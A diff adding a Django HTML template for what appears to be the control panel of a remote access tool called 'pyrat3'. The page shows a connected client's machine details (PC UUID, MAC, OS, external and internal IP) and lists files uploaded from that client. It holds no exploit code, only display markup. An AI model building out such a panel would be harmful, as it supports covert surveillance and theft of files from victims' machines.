@@ -1,0 +1,56 @@
+{% extends 'pyrgui/base.html' %}
+
+{% load static %}
+{% load user_tags %}
+
+{% block title %}pyrat3 :: client {{ client_id }} files{% endblock %}
+
+
+{% block under_header %}
+<div id="uploaded_files_client_details_table" >
+        <table class="client-table">
+            <tr class="client-table-header">
+                <th id="uploaded_files_client_client_id" class="client-table-l">Client ID</th>
+                <th id="uploaded_files_client_pc_uuid" class="client-table-xxl">PC UUID</th>
+                <th id="uploaded_files_client_join_date" class="client-table-xl">Join date</th>
+                <th id="uploaded_files_client_country" class="client-table-s">Country</th>
+                <th id="uploaded_files_client_mac" class="client-table-xl">MAC</th>
+                <th id="uploaded_files_client_os" class="client-table-xl">OS</th>
+                <th id="uploaded_files_client_name">Name</th>
+                <th id="uploaded_files_client_ext_ip" class="client-table-xl">Ext IP</th>
+                <th id="uploaded_files_client_int_ip" class="client-table-xl">Int IP:</th>
+            </tr>
+            <tr class="uploaded-files-client-details-table-main-row">
+                <td>{{ client.client_id }}</td>
+                <td>{{ client.pc_uuid }}</td>
+                <td>{{ client.join_datetime|date:"Y-m-d H:i:s" }}</td>
+                <td>{{ client.country }}</td>
+                <td>{{ client.mac }}</td>
+                <td>{{ client.os }}</td>
+                <td>{{ client.name }}</td>
+                <td>{{ client.ext_ip }}</td>
+                <td>{{ client.int_ip }}</td>
+            </tr>
+        </table>
+    </div>
+{% endblock %}
+
+{% block main_content %}
+<div id="uploaded_files_list" class="uploaded-files-list">
+    {% if files_dict %}
+    <ul>
+    {% for file, attr in files_dict.items %}
+        <li id="uploaded_files_file_{{ forloop.counter0 }}">
+            <a class="uploaded-file-name"
+               href="{% get_media_prefix %}{{ client.client_id }}/{{ file }}" target="_blank">{{ file }}
+            </a>
+            <span class="uploaded-file-property">Size: {{ attr.size|filesizeformat }}</span>
+            <span class="uploaded-file-property">Creation date: {{ attr.mtime|date:"Y-m-d H:i:s" }}</span>
+        </li>
+    {% endfor %}
+    </ul>
+    {% else %}
+    <span class="uploaded-files-none">There are no files from this client!</span>
+    {% endif %}
+</div>
+{% endblock %}
